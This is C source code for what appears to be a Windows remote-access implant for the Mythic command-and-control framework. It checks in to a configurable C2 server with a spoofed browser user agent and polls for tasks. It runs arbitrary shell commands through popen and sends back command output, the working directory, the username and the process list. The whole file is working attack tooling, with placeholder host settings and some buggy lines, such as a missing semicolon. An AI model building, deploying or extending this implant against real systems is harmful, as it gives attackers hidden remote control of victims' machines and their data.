// C std libs
#include <iso646.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// windows.h and friends
#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>

// other libs
#include "cJSON.h"
#include "base64.h"

typedef cJSON* task_t;

//QUEUE START
#define MAX_SIZE 100
typedef struct Queue Queue;
struct Queue {
task_t items[MAX_SIZE];
unsigned int front;
unsigned int rear;
short size;
} q;

void init_queue(Queue *q){
q->rear = 0;
q->front = 0;
q->size = 0;    
}

static inline bool isEmpty(Queue *q) {
    return q->size == 0;
}

static inline bool isFull(Queue *q) {
    return q->size==MAX_SIZE;
}

void enqueue(Queue *q, task_t val){
    if(isFull(q)){
        printf("queue full :(\n");
        return;
    }   
    q->items[q->rear] = val;
    q->rear = (q->rear+1)%MAX_SIZE;
    q->size++;
    return;
}

task_t dequeue(Queue *q){
    if(isEmpty(q)){
        printf("queue empty :(\n");
        return 0;
    }
    task_t ret = q->items[q->front];
    q->front = (q->front + 1) %MAX_SIZE;
    q->size--;
    return ret;
}
void del_task(Queue *q){
    if(isEmpty(q)){
        printf("queue empty :(\n");
        return;
    }
    q->front = (q->front + 1) %MAX_SIZE;
    q->size--;
}

task_t peek(Queue *q){
if(isEmpty(q)){
        printf("queue empty :(\n");
        return 0;
    }

return q->items[q->front];
}
//QUEUE END


char* handle_shell_cmd(cJSON *task);
void dispatcher(cJSON *task);
bool sleep_with_jitter(int interval, int jitter);
void get_tasks();
void checkin();
char* send_c2_post_request(char* json_data);
void handle_ps_cmd(cJSON *task);

typedef struct {
    int port; 
    int interval; 
    int jitter;
    int eec; //it's bool, but whatever
    char host[256];
    char get_uri[64];
    char proxy_host[128];    //
    char post_uri[64];
    char query_path_name[64];
    char proxy_port[16]; //
    char proxy_user[64]; //
    char proxy_pass[64]; //
    char uuid[40];
    char killdate[32];  //
} implant_config;



char json_buff[250];

//implant_config config = {
//    .host = "REPLACE_ME_HOST",
//    .port = REPLACE_ME_PORT,     
//    .uuid = "REPLACE_ME_UUID",
//    .interval = REPLACE_ME_INTERVAL, //
//    .jitter = REPLACE_ME_JITTER,      //
//    .get_uri = "REPLACE_ME_GET_URI",  
//    .post_uri = "REPLACE_ME_POST_URI",
//    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",  // oryginal_config - use when compiling via
                                                        // mythic, not makefile
//    .eec = REPLACE_ME_EEC,        
//    .proxy_host = "REPLACE_ME_PROXY_HOST", //
//    .proxy_port = "REPLACE_ME_PROXY_PORT", //
//    .proxy_user = "REPLACE_ME_PROXY_USER", // 
//    .proxy_pass = "REPLACE_ME_PROXY_PASS", //
//    .killdate = "REPLACE_ME_KILLDATE" //
//};

implant_config config = {
    .host = "REPLACE_ME_HOST",
    .port = 1337,     
    .uuid = "REPLACE_ME_UUID",
    .interval = 420, //
    .jitter = 69,      //
    .get_uri = "REPLACE_ME_GET_URI",  
    .post_uri = "REPLACE_ME_POST_URI",
    .query_path_name = "REPLACE_ME_QUERY_PATH_NAME",
    .eec = 1,        
    .proxy_host = "REPLACE_ME_PROXY_HOST", //
    .proxy_port = "PROXY_PORT", //
    .proxy_user = "REPLACE_ME_PROXY_USER", // 
    .proxy_pass = "REPLACE_ME_PROXY_PASS", //
    .killdate = "REPLACE_ME_KILLDATE" //
};
char* build_message(char* json){
   size_t all_len = strlen(json) + 37;
    
    char* raw_msg = (char*)calloc(1,all_len); 
    strcat(raw_msg,config.uuid);
   strcat(raw_msg,json);

   char* encoded_str = base64_encode(raw_msg);
   free(raw_msg);
   return encoded_str;
}
char* send_c2_post_request(char* json_data) {

/*=========================================================================================================*/  
    HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;

    HINTERNET hConnect = InternetConnect(hInternet, config.host, config.port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return NULL; }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", config.post_uri, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return NULL; }
/*==========================================================================================================*/
/* weird winapi stuff, do not touch, it spreads leprosy*/

    char* to_be_send = build_message(json_data);
    const char* headers = "Content-Type: application/json\r\n";
    
    if (HttpSendRequest(hRequest, headers, -1, to_be_send, strlen(to_be_send))) {
        printf("wysłano post'a\n");
        
        char buffer[12000];
        DWORD bytesRead;
        if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
            char* response = (char*)malloc(bytesRead+1);
            memcpy(response,buffer,bytesRead);
            response[bytesRead] = '\0';
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return response;
            
        }
    }
    free(to_be_send);
return NULL;
}
void checkin(){
        char json_checkin_buff[190];
    snprintf(json_checkin_buff,sizeof(json_checkin_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
    char* resp = send_c2_post_request(json_checkin_buff); //checkin do serwera
    cJSON *root = cJSON_Parse(resp);
    if (root !=NULL){
        cJSON *status = cJSON_GetObjectItemCaseSensitive(root, "status");
        cJSON *id = cJSON_GetObjectItemCaseSensitive(root, "id");
        cJSON *action = cJSON_GetObjectItemCaseSensitive(root, "action");
        if(strcmp(status->valuestring,"success") == 0 && cJSON_IsString(id) && !strcmp(action->valuestring,"checkin")){
            strncpy(config.uuid,id->valuestring,sizeof(config.uuid) - 1);
        }

    }
    free(resp);
    cJSON_Delete(root);
}
	
void get_tasks(){
char* tasks_json = send_c2_post_request("{\"action\": \"get_tasking\", \"tasking_size\": -1}");
cJSON *root = cJSON_Parse(tasks_json);
if (root != NULL) {
cJSON *tasks = cJSON_GetObjectItemCaseSensitive(root, "tasks");
if(cJSON_IsArray(tasks)){
cJSON *task = NULL;
cJSON_ArrayForEach(task,tasks){
    //dispatcher(task);
    cJSON* d_task = cJSON_Duplicate(task,1);
    enqueue(&q, d_task);
                              }

                       }

                 }
free(tasks_json);
cJSON_Delete(root);
return;
              }

bool sleep_with_jitter(int interval, int jitter){
    int variation = (interval * jitter)/100;
    int sleep = (interval - variation) + rand()%(2*variation+1);
        Sleep(sleep * 1000);
return 0;
}


char* handle_shell_cmd(cJSON *task){
     FILE *fp;
     char *command = cJSON_GetObjectItemCaseSensitive(task, "parameters")->valuestring;
     char output[512];
size_t read;
     fp = popen(command,"r"); 
         read = fread(output, 1, 512, fp);
    fclose(fp);

char* ret_val = (char*)calloc(1,read+1);
output[read] = '\0'
strncpy(ret_val,output,read+1);
return ret_val;
}

char* handle_pwd_cmd(/*cJSON *task*/){
     char output[260];
     size_t read = 0;
     read = GetCurrentDirectoryA(260,output);
     if(read){
        char* ret_val = (char*)malloc(read+1);
        strncpy(ret_val,output,read+1);
        return ret_val;
     }
     char* ret_val = (char*)malloc(19);
        strncpy(ret_val,"failed to read cwd\0",19);
        return ret_val;

}

char* handle_whoami_cmd(/*cJSON *task*/){
     char output[21];
     long unsigned int read = 21;
     GetUserNameA(output,&read);
     if(read){
        char* ret_val = (char*)malloc(read);
        strncpy(ret_val,output,read);
        return ret_val;
     }
     char* ret_val = (char*)malloc(22);
        strncpy(ret_val,"failed to read whoami\0",22);
        return ret_val;

}



void dispatcher(cJSON *task){
    char* command_output;
    if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell"))){
        command_output = handle_shell_cmd(task);
    }
    else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"pwd"))){
         command_output = handle_pwd_cmd();

    }
    else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"whoami"))){
         command_output = handle_whoami_cmd(task);
    }
    else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"ps"))){
         handle_ps_cmd(task);
         cJSON_Delete(task);
         return;
    } else{
        printf(":( unknown command:\n");
            puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
            cJSON_Delete(task);
   return;

    };

        cJSON *root = cJSON_CreateObject();
        cJSON_AddStringToObject(root,"action","post_response");
        cJSON *arr = cJSON_CreateArray();
        cJSON_AddItemToObject(root,"responses",arr);
                
            cJSON *obj1 = cJSON_CreateObject();
            cJSON_AddStringToObject(obj1,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring);
            cJSON_AddStringToObject(obj1,"user_output",command_output);
        cJSON_AddBoolToObject(obj1, "completed", 1);

            cJSON_AddItemToArray(arr,obj1);

        char* command_executed = cJSON_PrintUnformatted(root);
        send_c2_post_request(command_executed);
        free(command_executed);
        free(command_output);
        cJSON_Delete(root);
        cJSON_Delete(task);

    
   return;

}

void handle_ps_cmd(cJSON *task){
     HANDLE han = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
     if(han == INVALID_HANDLE_VALUE) {

        char* ret_val = (char*)malloc(17);
        strncpy(ret_val,"failed to get ps\0",17);
        free(ret_val);
        return;
    }

     PROCESSENTRY32 proces;
     proces.dwSize = sizeof(PROCESSENTRY32);

        cJSON *root = cJSON_CreateObject();
        cJSON_AddStringToObject(root,"action","get_tasking");
        cJSON *arr = cJSON_CreateArray();
        cJSON *obj = cJSON_CreateObject();
        cJSON *user_input_p = cJSON_CreateObject();
        cJSON_AddItemToArray(arr,obj);
        cJSON_AddItemToObject(root,"responses",arr);
        cJSON_AddStringToObject(obj,"status","processing");
        cJSON_AddBoolToObject(obj,"completed",0);
        char task_id[37];
        strncpy(task_id,cJSON_GetObjectItemCaseSensitive(task, "id")->valuestring,37);
        cJSON_AddStringToObject(obj,"task_id",task_id);
        cJSON_AddItemToArray(arr,user_input_p);

    unsigned char counter = 0;
    char buff[1108];
    char process_buff[272] = {'\0'};
            snprintf(buff,1108,"PID;PPID;szExeFile\n");

 if(Process32First(han,&proces)){
     do{
        
        snprintf(process_buff,272,"%ld;%ld;%s\n",proces.th32ProcessID,proces.th32ParentProcessID,proces.szExeFile);
            strncat(buff,process_buff,sizeof(buff) - strlen(buff) - 1);
        counter++;
        if(counter>=4){ //TODO: in last loop iteration, if counter>=4 data is lost 
            cJSON_AddStringToObject(user_input_p,"user_output",buff);
            cJSON_AddStringToObject(user_input_p,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring); 
            char* sent = cJSON_PrintUnformatted(root);
            send_c2_post_request(sent);
            free(sent);
             //TODO: somehow handle the answer from C2 server (tasks) 
            cJSON_DeleteItemFromObject(user_input_p, "user_output");
            user_input_p = cJSON_CreateObject();
            cJSON_AddItemToArray(arr,user_input_p);
            counter = 0;
            buff[0] = '\0';

        }
     }while (Process32Next(han,&proces));
 }

if(counter>0){
cJSON_AddStringToObject(user_input_p,"user_output",buff);
            cJSON_AddStringToObject(user_input_p,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring); 
            char* sent = cJSON_PrintUnformatted(root);
            send_c2_post_request(sent);
            free(sent);
             //TODO: somehow handle the answer from C2 server (tasks) 
            cJSON_DeleteItemFromObject(user_input_p, "user_output");
            user_input_p = cJSON_CreateObject();
            cJSON_AddItemToArray(arr,user_input_p);
            counter = 0;
            buff[0] = '\0';

}
cJSON_Delete(user_input_p);
cJSON *statusik = cJSON_GetObjectItemCaseSensitive(obj,"status");
cJSON_SetValuestring(statusik,"success");
cJSON *completed = cJSON_GetObjectItemCaseSensitive(obj,"completed");
cJSON_SetBoolValue(completed, 1);

//cJSON_DeleteItemFromObject(cJSON_GetObjectItemCaseSensitive(obj,"user_output"),);
char* unformatted_buff = cJSON_PrintUnformatted(root);
send_c2_post_request(unformatted_buff);
cJSON_Delete(root);
CloseHandle(han);
free(unformatted_buff);
return;
}

int main(){

    init_queue(&q);
    checkin();
//main loop
abc:
        if (!isEmpty(&q)){
        dispatcher(dequeue(&q));
    }
        get_tasks();
        sleep_with_jitter(config.interval,config.jitter); //jitter also activates between every task completion - idk if i like it, but let's skip that for a moment

goto abc;

	return 0;
}
